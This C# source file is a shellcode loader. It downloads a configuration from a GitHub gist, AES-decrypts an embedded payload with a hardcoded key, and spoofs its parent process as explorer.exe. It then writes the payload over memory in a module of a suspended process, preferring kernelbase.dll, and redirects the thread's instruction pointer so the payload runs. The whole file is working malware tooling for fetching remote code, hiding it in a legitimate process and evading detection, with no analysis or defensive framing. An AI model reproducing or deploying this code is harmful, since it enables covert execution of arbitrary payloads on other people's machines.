using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace sharp
{
    public class Config
    {
        public string Target { get; set; }
        public string Version { get; set; }
        public string Payload { get; set; }
    }

    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo; 
            public IntPtr lpAttributeList; 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public uint nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(
            int hProcess,
            int lpBaseAddress,
            byte[] lpBuffer, 
            int dwSize, 
            ref int lpNumberOfBytesRead
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(
           IntPtr hProcess,
           IntPtr lpThreadAttributes,
           uint dwStackSize,
           IntPtr lpStartAddress,
           IntPtr lpParameter,
           uint dwCreationFlags,
           out uint lpThreadId
       );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint dwDesiredAccess, 
            bool bInheritHandle, 
            int dwProcessId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            uint dwFlags,
            ref IntPtr lpSize
        );
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            ref IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void DeleteProcThreadAttributeList(
            IntPtr lpAttributeList
        );

        [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool ResumeThread(IntPtr hThread);


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong Low;
            public long High;
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
           
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;


            public uint ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;

            public ulong Rip;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] FltSave;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;
            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(
            IntPtr hThread,
            ref CONTEXT64 lpContext
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(
            IntPtr hThread, 
            ref CONTEXT64 lpContext
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtectEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           UIntPtr dwSize,
           uint flNewProtect,
           out uint lpflOldProtect
            );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation, 
            int processInformationLength, 
            out int returnLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress; 
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }
        public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }
        static async Task Main()
        {
            using var client = new HttpClient();
            // 1. Downloading the config
            var response = await client.GetStringAsync("https://gist.github.com/Oicellyael/aa5ad596db1e2fadee3378a251c3afd5/raw/config.json");
            var options = new JsonSerializerOptions { AllowTrailingCommas = true, ReadCommentHandling = JsonCommentHandling.Skip };
            var config = JsonSerializer.Deserialize<Config>(response, options);

            if (config == null) return;

            // --- PPID SPOOFING PREPARATION UNIT ---
            var explorer = Process.GetProcessesByName("explorer");
            int pid = explorer[0].Id;
            var hParent = OpenProcess(0x001F0FFF, true, pid);

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

            IntPtr attributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(attributeList, 1, 0, ref lpSize);

            IntPtr parentHandle = hParent;
            UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x00020000, ref parentHandle, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            STARTUPINFOEX siEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            siEx.StartupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOEX));
            siEx.lpAttributeList = attributeList;

            // --- LAUNCH BLOCK ---
            // Using 0x00000004 (SUSPENDED) and 0x00080000 (EXTENDED_INFO)
            bool success = CreateProcess(null, config.Target, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x00080000, IntPtr.Zero, @"C:\Windows\System32", ref siEx, out pi);

            if (success)
            {
                Console.WriteLine($"[+] Process created via Explorer. PID: {pi.dwProcessId}");

                // --- INJECTION BLOCK (YOUR TOP CODE) ---
                // 2. Decryption
                byte[] key = System.Text.Encoding.UTF8.GetBytes("12345678901234567890123456789012");
                byte[] iv = System.Text.Encoding.UTF8.GetBytes("1234567890123456");
                byte[] payload = AesDecrypt(Convert.FromBase64String(config.Payload), key, iv);

                // 3. Allocation in the "adopted" process
                IntPtr targetAddress = IntPtr.Zero;
                IntPtr fallbackAddress = targetAddress;
                int payloadSize = payload.Length;
                string[] banDll = { "ntdll.dll", "kernel32.dll", "advapi32.dll" };
                
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                foreach (ProcessModule module in Process.GetProcessById((int)pi.dwProcessId).Modules)
                {
                    if (module.ModuleMemorySize < payloadSize)
                        continue;

                    if (module.ModuleName.Equals("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
                    {
                        if (module.ModuleMemorySize > payloadSize)
                        {
                            targetAddress = module.BaseAddress;
                            break;
                        }
                    }
                    if (module.ModuleName != "kernelbase.dll")
                    {
                        if (banDll.Any(name => name.Equals(module.ModuleName, StringComparison.OrdinalIgnoreCase)))
                            continue;

                        if (fallbackAddress == IntPtr.Zero)
                            fallbackAddress = module.BaseAddress;
                    }

                }

                IntPtr finalAddress = targetAddress != IntPtr.Zero ? targetAddress : fallbackAddress;

                if (finalAddress != IntPtr.Zero)
                {
                    finalAddress += 0x2000; 
                }
                uint oldProtect;
                VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payload.Length, 0x04, out oldProtect);
                IntPtr bytesWritten;
                WriteProcessMemory(pi.hProcess, finalAddress, payload, payload.Length, out bytesWritten);
                VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payload.Length, 0x20, out oldProtect);
        
                // 5. Starting the thread
                CONTEXT64 cONTEXT64 = new CONTEXT64();

                cONTEXT64.ContextFlags = 0x100001;
                bool successThread = GetThreadContext(pi.hThread, ref cONTEXT64);
                if (successThread)
                    Console.WriteLine("[+] Thread context retrieved successfully.");

                else
                    Console.WriteLine("[-] Failed to get thread context: " + Marshal.GetLastWin32Error());


                Console.WriteLine($"[+] Original RIP: 0x{cONTEXT64.Rip:X}");
                Console.WriteLine($"[+] New RIP (Shellcode): 0x{(ulong)finalAddress.ToInt64():X}");

                ulong oldRip = cONTEXT64.Rip;
                cONTEXT64.Rsp -= 8;
                byte[] ripBytes = BitConverter.GetBytes(oldRip);
                WriteProcessMemory(pi.hProcess, (IntPtr)cONTEXT64.Rsp, ripBytes, ripBytes.Length, out _);

                cONTEXT64.Rip = (ulong)finalAddress.ToInt64();
                bool successSetContext = SetThreadContext(pi.hThread, ref cONTEXT64);

                if (successSetContext)
                    Console.WriteLine("[+] Thread context set successfully.");

                else
                    Console.WriteLine("[-] Failed to set thread context: " + Marshal.GetLastWin32Error());

                ResumeThread(pi.hThread);
                // Clean up handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
            }

            //---FINAL ATTRIBUTE CLEANUP ---
            DeleteProcThreadAttributeList(attributeList);
            Marshal.FreeHGlobal(attributeList);
            CloseHandle(hParent);

            Console.WriteLine("Done. Press any key...");
            Console.ReadKey();

        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
}
